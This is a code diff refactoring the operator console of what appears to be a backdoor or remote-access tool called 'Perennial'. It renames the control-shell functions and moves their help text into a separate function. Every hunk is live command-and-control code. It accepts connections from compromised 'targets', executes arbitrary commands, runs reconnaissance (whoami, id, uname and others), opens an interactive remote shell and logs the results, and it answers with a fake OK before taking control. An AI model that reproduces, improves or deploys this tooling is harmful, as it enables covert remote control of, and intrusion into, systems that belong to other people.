@@ -30,11 +30,11 @@ def get_args():
     return parser.parse_args()
 
 
-def ctrl_shell_server(s, PORT):
+def shell_server(s, PORT):
     cmds = ['exit', 'help', 'exec', 'recon', 'shell']
     print '[+] ({}) Entering control shell'.format(datetime.now())
     conn, addr = s.accept()
-    prompt = ctrl_shell_exchange(conn, 'getprompt')
+    prompt = shell_exchange(conn, 'getprompt')
     print 'Welcome to psh, the perennial shell!'
     print 'Running `help\' will give you a list of supported commands.'
     while True:
@@ -42,56 +42,43 @@ def ctrl_shell_server(s, PORT):
             inp = raw_input(PSH_PROMPT)
             if inp == '':
                 continue
+            base = inp.split()[0]
             # exit
-            elif inp == cmds[0]:
+            if inp == cmds[0]:
                 break
             # help
-            elif inp.split()[0] == cmds[1]:
+            elif base == cmds[1]:
                 print 'Commands:'
                 for cmd in cmds:
                     print '  {}'.format(cmd)
             # exec
-            elif inp.split()[0] == cmds[2]:
+            elif base == cmds[2]:
                 inp += ' '  # for regex
                 exec_regex = '^exec ((("[^"]+")|(-o( [\w.]+)?))\ )+$'
                 if re.search(exec_regex, inp) and '"' in inp:
-                    ctrl_shell_generic(conn, *ctrl_shell_exec_preproc(inp))
+                    shell_generic(conn, *shell_exec_preproc(inp))
                 else:
-                    print 'Execute commands on target.'
-                    print 'usage: exec [-o [filename]] "cmd1" ["cmd2" "cmd3" ...]'
-                    print '\nExecute given commands and optionally log to file with optional filename.'
-                    print '\noptions:'
-                    print '-h\t\tshow help'
-                    print '-o filename\t\twrite results to file in {}/'.format(OUT)
+                    shell_cmd_help(cmds, 2)
             # recon
-            elif inp.split()[0] == cmds[3]:
+            elif base == cmds[3]:
                 if re.search('^recon( -o( [\w.]+)?)?$', inp):
                     if '-o' in inp.split():
                         if len(inp.split()) == 3:
-                            ctrl_shell_generic(conn, inp.split()[0], True,
-                                               inp.split()[2])
+                            shell_generic(conn, base, True, inp.split()[2])
                         else:
-                            ctrl_shell_generic(conn, inp.split()[0], True)
+                            shell_generic(conn, base, True)
                     else:
-                        ctrl_shell_generic(conn, inp.split()[0])
+                        shell_generic(conn, base)
                 else:
-                    print 'Basic reconaissance of target.'
-                    print 'usage: recon [-h] [-o]'
-                    print '\nExecutes, whoami, id, w, who -a, uname -a, and lsb_release -a on target where applicable.'
-                    print '\noptions:'
-                    print '-h\t\tshow help'
-                    print '-o\t\twrite results to file in {}/'.format(OUT)
+                    shell_cmd_help(cmds, 3)
             # shell
-            elif inp.split()[0] == cmds[4]:
+            elif base == cmds[4]:
                 if inp == 'shell':
-                    ctrl_shell_shell(conn, prompt)
+                    shell_shell(conn, prompt)
                 else:
-                    print 'Basic shell on target (forwards stdout of commands executed).'
-                    print 'usage: shell [-h]'
-                    print '\noptions:'
-                    print '-h\t\tshow help'
+                    shell_cmd_help(cmds, 4)
             else:
-                print 'psh: {}: command not found'.format(inp.split()[0])
+                print 'psh: {}: command not found'.format(base)
         except KeyboardInterrupt:
             print
             continue
@@ -102,14 +89,14 @@ def ctrl_shell_server(s, PORT):
     print '[+] ({}) Exiting control shell.'.format(datetime.now())
 
 
-def ctrl_shell_generic(s, req, write_flag=False, write_file=None):
-    resp = ctrl_shell_exchange(s, req)
+def shell_generic(s, req, write_flag=False, write_file=None):
+    resp = shell_exchange(s, req)
     print resp
     if write_flag:
-        ctrl_shell_write(resp, req.split()[0], OUT, write_file)
+        shell_write(resp, req.split()[0], OUT, write_file)
 
 
-def ctrl_shell_write(response, prefix, out_dir, write_file=None):
+def shell_write(response, prefix, out_dir, write_file=None):
     ts = datetime.now().strftime('%Y%m%d%M%S')
     out_ts_dir = '{}/{}'.format(out_dir, ts[:len('20140101')])
     if write_file:
@@ -126,7 +113,29 @@ def ctrl_shell_write(response, prefix, out_dir, write_file=None):
         print 'psh : {} log written to {}'.format(prefix, outfile)
 
 
-def ctrl_shell_exec_preproc(inp):
+def shell_cmd_help(cmds, ind):
+    if ind == 2:
+        print 'Execute commands on target.'
+        print 'usage: exec [-o [filename]] "cmd1" ["cmd2" "cmd3" ...]'
+        print '\nExecute given commands and optionally log to file with optional filename.'
+        print '\noptions:'
+        print '-h\t\tshow help'
+        print '-o filename\t\twrite results to file in {}/'.format(OUT)
+    elif ind == 3:
+        print 'Basic reconaissance of target.'
+        print 'usage: recon [-h] [-o]'
+        print '\nExecutes, whoami, id, w, who -a, uname -a, and lsb_release -a on target where applicable.'
+        print '\noptions:'
+        print '-h\t\tshow help'
+        print '-o\t\twrite results to file in {}/'.format(OUT)
+    elif ind == 4:
+        print 'Basic shell on target (forwards stdout of commands executed).'
+        print 'usage: shell [-h]'
+        print '\noptions:'
+        print '-h\t\tshow help'
+
+
+def shell_exec_preproc(inp):
     # normalize
     tmp = inp.replace('-o', '').replace('  ', ' ')
     tmp = tmp.split()
@@ -141,7 +150,7 @@ def ctrl_shell_exec_preproc(inp):
     return tmp, write_flag, write_file
 
 
-def ctrl_shell_shell(s, prompt):
+def shell_shell(s, prompt):
     pass
     while True:
         try:
@@ -151,7 +160,7 @@ def ctrl_shell_shell(s, prompt):
             elif inp == 'exit':
                 break
             else:
-                print ctrl_shell_exchange(s, 'shell {}'.format(inp))
+                print shell_exchange(s, 'shell {}'.format(inp))
         except KeyboardInterrupt:
             print
             continue
@@ -160,7 +169,7 @@ def ctrl_shell_shell(s, prompt):
             break
 
 
-def ctrl_shell_exchange(conn, req):
+def shell_exchange(conn, req):
     socksend(conn, req)
     return sockrecv(conn)
 
@@ -229,7 +238,7 @@ def main():
         conn.send(FAKEOK)
         conn.close()
         try:
-            ctrl_shell_server(s, PORT)
+            shell_server(s, PORT)
         except socket.error as e:
             print '[!] ({}) Socket error: {}'.format(datetime.now(), e.message)
             print '[-] ({}) Perennial terminated.'.format(datetime.now())
